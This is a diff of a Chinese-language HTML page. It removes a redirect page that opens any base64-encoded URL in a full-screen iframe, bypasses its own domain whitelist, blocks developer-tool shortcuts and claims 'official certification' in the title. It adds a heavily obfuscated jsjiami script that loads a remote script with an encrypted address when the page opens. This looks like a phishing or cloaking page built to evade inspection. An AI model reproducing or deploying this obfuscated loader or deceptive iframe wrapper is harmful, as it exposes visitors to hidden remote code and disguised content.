@@ -1,192 +1,34 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
+<!doctype html>
+<html lang="zh">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title></title>
-    <style>
-        .container {
-            width: 100px;
-            height: 100px;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: rotate-move 2s ease-in-out infinite;
-            display: none;
-        }
-        .dot {
-            width: 15px;
-            height: 15px;
-            border-radius: 50%;
-            position: absolute;
-            top: 0;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            margin: auto;
-        }
-        .dot-3 { background-color: #f74d75; animation: dot-3-move 2s ease infinite; }
-        .dot-2 { background-color: #10beae; animation: dot-2-move 2s ease infinite; }
-        .dot-1 { background-color: #ffe386; animation: dot-1-move 2s ease infinite; }
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="renderer" content="webkit">
+  <meta name="layoutmode" content="standard">
+  <meta name="imagemode" content="force">
+  <meta name="wap-font-scale" content="no">
+  <meta name="format-detection" content="telephone=no">
 
-        @keyframes dot-3-move {
-            20%,100% { transform: scale(1) }
-            45%,80% { transform: translateY(-18px) scale(.45) }
-        }
-        @keyframes dot-2-move {
-            20%,100% { transform: scale(1) }
-            45%,80% { transform: translate(-16px, 12px) scale(.45) }
-        }
-        @keyframes dot-1-move {
-            20%,100% { transform: scale(1) }
-            45%,80% { transform: translate(16px, 12px) scale(.45) }
-        }
-        @keyframes rotate-move {
-            55% { transform: translate(-50%, -50%) rotate(0deg) }
-            80%,100% { transform: translate(-50%, -50%) rotate(360deg) }
-        }
+  <title></title>
 
-        /* 全局水印样式 */
-        .watermark {
-            position: fixed;
-            pointer-events: none;
-            width: 100%;
-            height: 100%;
-            background-image: repeating-linear-gradient(
-                    -45deg,
-                    rgba(255, 0, 0, 0.1),
-                    rgba(255, 0, 0, 0.1) 20px,
-                    rgba(0, 0, 255, 0.1) 20px,
-                    rgba(0, 0, 255, 0.1) 40px
-            );
-            z-index: 9999;
-            display: none;
-        }
-        .watermark-text {
-            position: absolute;
-            color: rgba(255, 0, 0, 0.6);
-            font-size: 18px;
-            font-weight: bold;
-            text-align: center;
-            width: 100%;
-            top: 50%;
-            transform: translateY(-50%);
-            text-shadow: 1px 1px 1px #fff;
-        }
 
-        /* iframe样式 */
-        .content {
-            height: 100%;
-            width: 100%;
-            position: fixed;
-            inset: -2px;
-            z-index: 1;
-        }
-    </style>
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="">
+  <meta property="og:description" content="">
+  <meta property="og:image" content="">
+
+  <link rel="shortcut icon" href="" type="image/x-icon">
+  <style>
+    *{margin:0;padding:0;border:0}
+    body,html{min-height:100%;display:flex;justify-content:center;align-items:center;background:#f8f8f8;font-family:Arial,sans-serif;text-align:center}
+    body{overflow:hidden}
+    .error-content{color:red;font-size:18px}
+  </style>
 </head>
-
 <body>
-<!-- 三点加载动画容器 -->
-<div class="container" id="loadingContainer">
-    <div class="dot dot-1"></div>
-    <div class="dot dot-2"></div>
-    <div class="dot dot-3"></div>
-</div>
-
-<!-- 全局水印 -->
-<div class="watermark" id="watermark">
-</div>
-
 <script>
-    (function() {
-        // 白名单域名配置（预留位置方便后期添加）
-        const WHITELIST_CONFIG = {
-            domains: [
-                '*',
-            ],
-        };
-
-        // 显示三点加载动画
-        function showLoadingAnimation() {
-            document.getElementById('loadingContainer').style.display = 'block';
-        }
-
-        // 验证URL域名是否在白名单
-        function isAllowedDomain(url) {
-            return true
-            try {
-                const domain = new URL(url).hostname.replace('www.', '');
-                return WHITELIST_CONFIG.domains.some(allowedDomain => {
-                    return domain === allowedDomain ||
-                        domain.endsWith('.' + allowedDomain);
-                });
-            } catch (e) {
-                console.error('URL解析失败:', e);
-                return false;
-            }
-        }
-
-        // 主处理逻辑
-        function processRedirect() {
-            showLoadingAnimation();
-
-            const urlParams = new URLSearchParams(window.location.search);
-            const encodedParam = urlParams.get('c');
-
-            if (!encodedParam) {
-                document.getElementById('watermark').style.display = 'block';
-                document.getElementById('loadingContainer').style.display = 'none';
-                return;
-            }
-
-            try {
-                const trueUrl = atob(encodedParam);
-                if (trueUrl.includes("http")) {
-                    // 检查域名是否在白名单
-                    if (!isAllowedDomain(trueUrl)) {
-                        document.getElementById('watermark').style.display = 'block';
-                        document.querySelector('.watermark-text').textContent = WHITELIST_CONFIG.watermarkText;
-                    }
-
-                    // 创建并加载iframe
-                    const iframe = document.createElement('iframe');
-                    iframe.className = 'content';
-                    iframe.src = trueUrl;
-
-                    iframe.addEventListener('load', function() {
-                        document.getElementById('loadingContainer').style.display = 'none';
-                    });
-
-                    document.body.appendChild(iframe);
-                }
-            } catch (e) {
-                console.error('URL解码失败:', e);
-                document.getElementById('watermark').style.display = 'block';
-                document.getElementById('loadingContainer').style.display = 'none';
-            }
-        }
-
-        // 禁止F12开发者工具
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' ||
-                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                (e.ctrlKey && e.key === 'U')) {   
-                e.preventDefault();
-            }
-        });
-
-        window.addEventListener('message', function(event) {
-            // 验证消息类型（确保是标题同步请求）
-            if (event.data.type === 'SYNC_TITLE') {
-                // 将iframe发送的标题设置为父页面标题
-                document.title = event.data.title || '官方认证';
-            }
-        }, false);
-
-        processRedirect();
-    })();
+var _0xodC='jsjiami.com.v7v9';const _0x53af53=_0x464d;(function(_0x8c3cae,_0x2dcc9e,_0x23d0a8,_0x367daf,_0x6bc4d9,_0x15fee9,_0x2df855){return _0x8c3cae=_0x8c3cae>>0x4,_0x15fee9='hs',_0x2df855='hs',function(_0xd80888,_0x566165,_0x1edf1f,_0x58ed23,_0x584dd5){const _0x5694b7=_0x464d;_0x58ed23='tfi',_0x15fee9=_0x58ed23+_0x15fee9,_0x584dd5='up',_0x2df855+=_0x584dd5,_0x15fee9=_0x1edf1f(_0x15fee9),_0x2df855=_0x1edf1f(_0x2df855),_0x1edf1f=0x0;const _0x58211b=_0xd80888();while(!![]&&--_0x367daf+_0x566165){try{_0x58ed23=parseInt(_0x5694b7(0xee,'INwk'))/0x1*(parseInt(_0x5694b7(0xec,'8o2k'))/0x2)+-parseInt(_0x5694b7(0x109,'(%$l'))/0x3+-parseInt(_0x5694b7(0x10c,'5^jA'))/0x4*(-parseInt(_0x5694b7(0x105,'tvlw'))/0x5)+parseInt(_0x5694b7(0xf3,'DIkN'))/0x6+-parseInt(_0x5694b7(0x10a,'EKGk'))/0x7*(parseInt(_0x5694b7(0x116,'DecO'))/0x8)+-parseInt(_0x5694b7(0xf1,'OhJ!'))/0x9*(-parseInt(_0x5694b7(0xf0,'DkXS'))/0xa)+parseInt(_0x5694b7(0xfc,'O^IB'))/0xb*(-parseInt(_0x5694b7(0x11c,'t)BN'))/0xc);}catch(_0x2da611){_0x58ed23=_0x1edf1f;}finally{_0x584dd5=_0x58211b[_0x15fee9]();if(_0x8c3cae<=_0x367daf)_0x1edf1f?_0x6bc4d9?_0x58ed23=_0x584dd5:_0x6bc4d9=_0x584dd5:_0x1edf1f=_0x584dd5;else{if(_0x1edf1f==_0x6bc4d9['replace'](/[SHIVuUlGFTnNgrRPLbQ=]/g,'')){if(_0x58ed23===_0x566165){_0x58211b['un'+_0x15fee9](_0x584dd5);break;}_0x58211b[_0x2df855](_0x584dd5);}}}}}(_0x23d0a8,_0x2dcc9e,function(_0x16f98a,_0x5797ee,_0x23b5c0,_0x102968,_0x1ef497,_0xcfb9b9,_0x5e97aa){return _0x5797ee='\x73\x70\x6c\x69\x74',_0x16f98a=arguments[0x0],_0x16f98a=_0x16f98a[_0x5797ee](''),_0x23b5c0='\x72\x65\x76\x65\x72\x73\x65',_0x16f98a=_0x16f98a[_0x23b5c0]('\x76'),_0x102968='\x6a\x6f\x69\x6e',(0x1bd45d,_0x16f98a[_0x102968](''));});}(0xc90,0x2c8e0,_0x38c5,0xcb),_0x38c5)&&(_0xodC=0xcb);function _0x464d(_0x2f5955,_0x139c4c){const _0x38c5de=_0x38c5();return _0x464d=function(_0x464d51,_0x23e8dd){_0x464d51=_0x464d51-0xe3;let _0x19b0c8=_0x38c5de[_0x464d51];if(_0x464d['RoLqlD']===undefined){var _0x19314e=function(_0x408613){const _0x100a37='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4ef0db='',_0x294fe6='';for(let _0x39dc3a=0x0,_0x3e1cbe,_0x2569f7,_0x217f5f=0x0;_0x2569f7=_0x408613['charAt'](_0x217f5f++);~_0x2569f7&&(_0x3e1cbe=_0x39dc3a%0x4?_0x3e1cbe*0x40+_0x2569f7:_0x2569f7,_0x39dc3a++%0x4)?_0x4ef0db+=String['fromCharCode'](0xff&_0x3e1cbe>>(-0x2*_0x39dc3a&0x6)):0x0){_0x2569f7=_0x100a37['indexOf'](_0x2569f7);}for(let _0x4945e6=0x0,_0x47fca9=_0x4ef0db['length'];_0x4945e6<_0x47fca9;_0x4945e6++){_0x294fe6+='%'+('00'+_0x4ef0db['charCodeAt'](_0x4945e6)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x294fe6);};const _0x575fec=function(_0x4c49d0,_0xae4238){let _0x5efe09=[],_0xf4ba5c=0x0,_0x3db9fb,_0x1f2bcf='';_0x4c49d0=_0x19314e(_0x4c49d0);let _0x53d713;for(_0x53d713=0x0;_0x53d713<0x100;_0x53d713++){_0x5efe09[_0x53d713]=_0x53d713;}for(_0x53d713=0x0;_0x53d713<0x100;_0x53d713++){_0xf4ba5c=(_0xf4ba5c+_0x5efe09[_0x53d713]+_0xae4238['charCodeAt'](_0x53d713%_0xae4238['length']))%0x100,_0x3db9fb=_0x5efe09[_0x53d713],_0x5efe09[_0x53d713]=_0x5efe09[_0xf4ba5c],_0x5efe09[_0xf4ba5c]=_0x3db9fb;}_0x53d713=0x0,_0xf4ba5c=0x0;for(let _0x41c0bb=0x0;_0x41c0bb<_0x4c49d0['length'];_0x41c0bb++){_0x53d713=(_0x53d713+0x1)%0x100,_0xf4ba5c=(_0xf4ba5c+_0x5efe09[_0x53d713])%0x100,_0x3db9fb=_0x5efe09[_0x53d713],_0x5efe09[_0x53d713]=_0x5efe09[_0xf4ba5c],_0x5efe09[_0xf4ba5c]=_0x3db9fb,_0x1f2bcf+=String['fromCharCode'](_0x4c49d0['charCodeAt'](_0x41c0bb)^_0x5efe09[(_0x5efe09[_0x53d713]+_0x5efe09[_0xf4ba5c])%0x100]);}return _0x1f2bcf;};_0x464d['XZVhEf']=_0x575fec,_0x2f5955=arguments,_0x464d['RoLqlD']=!![];}const _0x413a45=_0x38c5de[0x0],_0x29bfc1=_0x464d51+_0x413a45,_0x55b840=_0x2f5955[_0x29bfc1];return!_0x55b840?(_0x464d['qOFqoD']===undefined&&(_0x464d['qOFqoD']=!![]),_0x19b0c8=_0x464d['XZVhEf'](_0x19b0c8,_0x23e8dd),_0x2f5955[_0x29bfc1]=_0x19b0c8):_0x19b0c8=_0x55b840,_0x19b0c8;},_0x464d(_0x2f5955,_0x139c4c);}async function init(){const _0x3f4fb6=_0x464d,_0x20019c={'jYEup':'<div\x20class=\x22error-content\x22>页面加载失败，请刷新重试</div>'};try{loadScript();}catch(_0x563176){console[_0x3f4fb6(0xe3,'ZLKL')](_0x3f4fb6(0x104,'(%$l'),_0x563176[_0x3f4fb6(0xf6,'t)BN')]),document[_0x3f4fb6(0x108,'gbcA')][_0x3f4fb6(0x114,'O^IB')]=_0x20019c[_0x3f4fb6(0x102,'y6QI')];}}function loadScript(){const _0x2256df=_0x464d,_0x5ec8b2={'GRLnZ':function(_0x3214a1){return _0x3214a1();},'WGNiP':'childList','ZZbRx':function(_0x2cae37,_0x378112){return _0x2cae37!==_0x378112;},'ayJjU':'egFSM','GOERD':_0x2256df(0xe8,'nOVR'),'bQyQv':_0x2256df(0x117,'5^jA'),'isVbY':_0x2256df(0x112,'DIkN'),'yDMMv':function(_0xfbeae8,_0x549a72){return _0xfbeae8+_0x549a72;},'nBSnx':_0x2256df(0xed,'EKGk')},_0x55c6fb=document[_0x2256df(0x101,'K*v]')](_0x5ec8b2[_0x2256df(0xf9,'yhOJ')]);_0x55c6fb[_0x2256df(0xf5,'y6QI')]=_0x5ec8b2[_0x2256df(0xfd,'L]WG')](_0x5ec8b2[_0x2256df(0xe4,'yhOJ')],Date[_0x2256df(0x10e,']Se6')]()),_0x55c6fb[_0x2256df(0xf8,'nOVR')]=function(){_0x5ec8b2['GRLnZ'](waitForContent);},_0x55c6fb[_0x2256df(0x111,'&ls0')]=function(){const _0x420c68=_0x2256df;if(_0x5ec8b2['ayJjU']===_0x5ec8b2[_0x420c68(0xe7,'INwk')])console[_0x420c68(0x11d,'iCX0')](_0x5ec8b2[_0x420c68(0x10d,'9*fd')]),document[_0x420c68(0xe5,'e6$0')][_0x420c68(0x10b,'Bc!F')]=_0x5ec8b2[_0x420c68(0xe6,'t)BN')];else{const _0x31ea09={'gYcRe':function(_0x4280e0,_0x49b2d8){return _0x4280e0===_0x49b2d8;},'rkSaJ':_0x5ec8b2[_0x420c68(0xff,'y6QI')],'AyfBA':function(_0x283919,_0x5b7b9d){const _0x3035de=_0x420c68;return _0x5ec8b2[_0x3035de(0xfa,'@!7N')](_0x283919,_0x5b7b9d);}};_0xc8eb22['forEach'](_0x594ea5=>{const _0x4b14cf=_0x420c68;if(_0x31ea09[_0x4b14cf(0x100,'C9Pq')](_0x594ea5['type'],_0x31ea09[_0x4b14cf(0x119,'!%EF')])&&_0x31ea09[_0x4b14cf(0x10f,'K*v]')](_0x2337a7['innerHTML'][_0x4b14cf(0xef,'K*v]')](),'')){}});}},document['body'][_0x2256df(0xf7,'iCX0')](_0x55c6fb);}function waitForContent(){const _0x2d25cb=_0x464d,_0x1a132d={'SrmMQ':function(_0x37cafb,_0x54a4b4){return _0x37cafb===_0x54a4b4;},'UrTCk':'childList','SRlcw':function(_0x250a8d,_0x5b23f1){return _0x250a8d!==_0x5b23f1;},'uICqQ':_0x2d25cb(0xf4,'Bc!F')},_0x539109=document['querySelector'](_0x1a132d['uICqQ']);if(!_0x539109)return;const _0x2ec75e=new MutationObserver(_0x28daf3=>{const _0x38c2eb=_0x2d25cb,_0x4ad7f7={'nKBRM':function(_0x4dfff5,_0x128d3c){const _0x272a80=_0x464d;return _0x1a132d[_0x272a80(0xeb,'iCX0')](_0x4dfff5,_0x128d3c);},'lLqNC':_0x1a132d[_0x38c2eb(0x11b,'EKGk')],'BeJCM':function(_0x26ef86,_0x163c5f){const _0x478488=_0x38c2eb;return _0x1a132d[_0x478488(0xe9,'6@Se')](_0x26ef86,_0x163c5f);}};_0x28daf3['forEach'](_0x48e77c=>{const _0x1838f5=_0x38c2eb;if(_0x4ad7f7[_0x1838f5(0x115,'5^jA')](_0x48e77c['type'],_0x4ad7f7['lLqNC'])&&_0x4ad7f7['BeJCM'](_0x539109['innerHTML']['trim'](),'')){}});}),_0x4dbdd2={'childList':!![],'subtree':!![]};_0x2ec75e[_0x2d25cb(0xf2,'@!7N')](_0x539109,_0x4dbdd2);}function _0x38c5(){const _0x5dd47e=(function(){return[_0xodC,'GPLIjLsSjIiamRTi.VcNHoHnFmu.UFlv7brQUgII==','WP8EW7FcLbf8W4VcNG','aCoPW6xcRa','WQPZWROZFblcLCofWRZcS8kKWQy','WPVcRmkEWOTvW7rlW60','FmoIWQBcU1KYqCk3WOS','d8ojW5GuW4f4hYVcKSoI','WPVdG35NWQW','WOZdK1i','lLi9W53cJG','WPC1WPK6u8kpWRBcJJ0c','WP7dHtvMW7hcGmk6','WQn5teJdQJa','xbHOWQFdVCouo8kOsmodpCkh','WPpdU0iSl8ojbCkOvG','vCk0WQjYW4S','W7zIA8oZyKzfWPfUEYdcOW','b8kBWOLwWQzbeGBcTSoCjZTAmGxcGNVcRNBcNmkdz08MDmkuWOxPOy/PN4FLIOZOVA/LP6/OTPNVV7JORPBLI5hML5lPHlpORB1lsCo5l2zK','WOlcGXjUWP1Ucw44BG7dMue','ECkHySoOW5G'].concat((function(){return['ASkUvComW6r+r8oTFSoIWPJdJbFcQdmo','W7/dQSkHWO5S','WQTCu8kObSo6WPldLW','WO/dHayBW6y','WP/dRCobyrK','ASkBW5BdJvu','WPi4W6VdQG','W7G/t8k1kq','WQZcUKpcIvK','W7NdU8kuWR7cRxVcLvzjWP4JySkrzrpdS2NdRSoIyW','W6DFtWr9','W7ddRCoYW5OrWPtcIq','WRNdHbK5W4u','WOqVW7OdtSoEWQWdfCoV','WOxcT8krWQKQWOy+WO4RlCkoDmoBcSk/WRThW5hcULqxWQtcHSkfqSozWQrDkSoIbMfBW5nFWRJdK8kBtSorWQVdR8k+W4K2W7hdRtZdICo0ahGoW6hcH8kc','W77dUJ7cJ0BcUc4hEa','g1KYW7i','WPnNW79AkmkmW545W5ZdIfxcRfS','W4NcKCkpeCodlSod','WQpdJXRdQmkVDmoY','W6eOdrxcR3dcTXNcGhNcOSkQW5K'].concat((function(){return['nSo1WQFcQ1K5ESkuWRmsWPmzWRXFWQ/dLmoOWQVdVq','FCoTW4K','W7ClrCkxpSorWP0','WOVdHGqrW7OWW6egW4NdN8kj','W5ddTmkrWR3cQxS','BCkQW5pdGxq','WPBdTWVdN8kL','W4hdLea+W5ejt3G2xa','W4ZcRr5XBCk1ymkYCmocW6RcT1a','EsRcGSkEW5m','W6yQc0tdMcpdHZBcNG','wCoyW6tdVCka','W4L1W7hcII0','dfK+W77cU8keemkmESoyfCkzEa','zmogW6/dOCkG','WPuZWPO9lCogW5xcPbGGF8klhG','W5WYW7TKpb0','aCkdW6ehcSoSW5KMW5a','C8kMW7NdTLZcJ8ohoZbQ'];}()));}()));}());_0x38c5=function(){return _0x5dd47e;};return _0x38c5();};document[_0x53af53(0x106,'P$!@')]==='complete'||document[_0x53af53(0xfb,'9&Q6')]==='interactive'?init():document[_0x53af53(0x11a,'!%EF')]('DOMContentLoaded',function(){const _0x2ed2da={'FFsmz':function(_0x4c79b3){return _0x4c79b3();}};_0x2ed2da['FFsmz'](init);});var version_ = 'jsjiami.com.v7';
 </script>
 </body>
 </html>
